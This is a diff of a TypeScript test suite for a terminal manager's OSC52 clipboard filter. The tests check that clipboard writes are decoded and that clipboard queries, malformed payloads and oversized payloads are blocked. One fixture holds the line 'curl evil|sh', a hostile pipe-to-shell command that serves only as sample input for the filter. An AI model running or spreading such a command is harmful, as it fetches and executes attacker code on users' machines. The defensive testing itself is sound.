@@ -20,6 +20,8 @@ import {
   resolveShellFile,
   resolveShellArgs,
   VALID_SHELLS,
+  OSC52_WRITE_MAX_B64,
+  OSC52_CARRY_CAP,
   type ManagedPty,
   type SpawnFn,
 } from './PtyManager';
@@ -172,30 +174,59 @@ describe('PtyManager 安全：shell allowlist（F-3-A1）', () => {
   });
 });
 
-describe('stripOsc52 OSC52 剪貼簿過濾（F-3-A2）', () => {
+describe('stripOsc52 OSC52 攔截（F-3-A2：序列不進 renderer；寫入解出、查詢封死）', () => {
   const b64 = (s: string): string => Buffer.from(s).toString('base64');
 
-  it('移除 BEL 終止的 OSC52，保留前後正常輸出', () => {
+  it('BEL 終止的 OSC52 自輸出移除、寫入 payload 解出（2026-07-02 拍板放寬）', () => {
     const input = Buffer.from(`before\x1b]52;c;${b64('PWNED curl evil|sh')}\x07after`);
-    const { output, carry } = stripOsc52(input);
+    const { output, carry, writes } = stripOsc52(input);
     expect(output.toString()).toBe('beforeafter');
     expect(carry.length).toBe(0);
+    expect(writes).toEqual(['PWNED curl evil|sh']);
   });
 
-  it('移除 ESC\\ (ST) 終止的 OSC52', () => {
+  it('移除 ESC\\ (ST) 終止的 OSC52，寫入照樣解出', () => {
     const input = Buffer.from(`x\x1b]52;c;${b64('hi')}\x1b\\y`);
-    expect(stripOsc52(input).output.toString()).toBe('xy');
+    const r = stripOsc52(input);
+    expect(r.output.toString()).toBe('xy');
+    expect(r.writes).toEqual(['hi']);
   });
 
-  it('跨 chunk 邊界以 carry 接續移除（切在序列中間）', () => {
+  it('寫入內容為 UTF-8 中文也正確解出', () => {
+    const input = Buffer.from(`\x1b]52;c;${b64('選取複製 世界')}\x07`);
+    expect(stripOsc52(input).writes).toEqual(['選取複製 世界']);
+  });
+
+  it('查詢（`?`＝請終端機回報剪貼簿）一律丟棄、絕不解出（防外洩，讀取方向照封）', () => {
+    const input = Buffer.from('A\x1b]52;c;?\x07B');
+    const { output, writes } = stripOsc52(input);
+    expect(output.toString()).toBe('AB');
+    expect(writes).toEqual([]);
+  });
+
+  it('缺分號 / 空 payload 的畸形 OSC52：移除且不寫入', () => {
+    expect(stripOsc52(Buffer.from('\x1b]52;garbled\x07')).writes).toEqual([]);
+    expect(stripOsc52(Buffer.from('\x1b]52;c;\x07')).writes).toEqual([]);
+  });
+
+  it('超過寫入上限的 payload：移除且不寫入（防灌爆）', () => {
+    const huge = 'A'.repeat(OSC52_WRITE_MAX_B64 + 4);
+    const { output, writes } = stripOsc52(Buffer.from(`\x1b]52;c;${huge}\x07ok`));
+    expect(output.toString()).toBe('ok');
+    expect(writes).toEqual([]);
+  });
+
+  it('跨 chunk 邊界以 carry 接續移除，寫入於序列完整時解出', () => {
     const full = `\x1b]52;c;${b64('SPLIT')}\x07`;
     const cut = Math.floor(full.length / 2);
     const r1 = stripOsc52(Buffer.from('A' + full.slice(0, cut)));
     expect(r1.output.toString()).toBe('A');
     expect(r1.carry.length).toBeGreaterThan(0);
+    expect(r1.writes).toEqual([]);
     const r2 = stripOsc52(Buffer.from(full.slice(cut) + 'B'), r1.carry);
     expect(r2.output.toString()).toBe('B');
     expect(r2.carry.length).toBe(0);
+    expect(r2.writes).toEqual(['SPLIT']);
   });
 
   it('非 OSC52 的 escape（CSI 顏色）原樣保留', () => {
@@ -204,10 +235,11 @@ describe('stripOsc52 OSC52 剪貼簿過濾（F-3-A2）', () => {
   });
 
   it('未終止且超過 carry 上限的 OSC52 不無界緩衝（資料原樣放行）', () => {
-    const input = Buffer.from('\x1b]52;' + 'A'.repeat(5000));
-    const { output, carry } = stripOsc52(input);
+    const input = Buffer.from('\x1b]52;' + 'A'.repeat(OSC52_CARRY_CAP + 100));
+    const { output, carry, writes } = stripOsc52(input);
     expect(carry.length).toBe(0);
-    expect(output.length).toBeGreaterThan(4096);
+    expect(output.length).toBeGreaterThan(OSC52_CARRY_CAP);
+    expect(writes).toEqual([]);
   });
 });
 
@@ -248,6 +280,29 @@ describe('PtyManager 高速輸出批次合併 + flow control（F-3-A5）', () =>
     const sent = emitData.mock.calls[0][0] as { chunk: Uint8Array };
     expect(sent.chunk.length).toBe(50 * 100 * 1024);
     expect(fake.resumed).toBeGreaterThanOrEqual(1); // 消化後恢復
+  });
+
+  it('OSC52 寫入經 flush 交給 writeClipboard、序列不進 emitData；查詢不觸發寫入', () => {
+    const fake = new FakePty();
+    const spawn: SpawnFn = () => fake;
+    const emitData = vi.fn();
+    const writeClipboard = vi.fn();
+    const mgr = new PtyManager(ctx.workspaces, ctx.lifecycle, {
+      spawn,
+      emitData,
+      writeClipboard,
+      flushIntervalMs: 16,
+    });
+    mgr.create({ wsId: ctx.wsId, shell: 'powershell' });
+
+    const b64 = Buffer.from('copied!').toString('base64');
+    fake.feed(Buffer.from(`out\x1b]52;c;${b64}\x07\x1b]52;c;?\x07put`));
+    vi.advanceTimersByTime(20);
+
+    expect(writeClipboard).toHaveBeenCalledTimes(1);
+    expect(writeClipboard).toHaveBeenCalledWith('copied!');
+    const sent = emitData.mock.calls[0][0] as { chunk: Uint8Array };
+    expect(Buffer.from(sent.chunk).toString()).toBe('output'); // 兩段 OSC52 皆未進 renderer
   });
 });
 
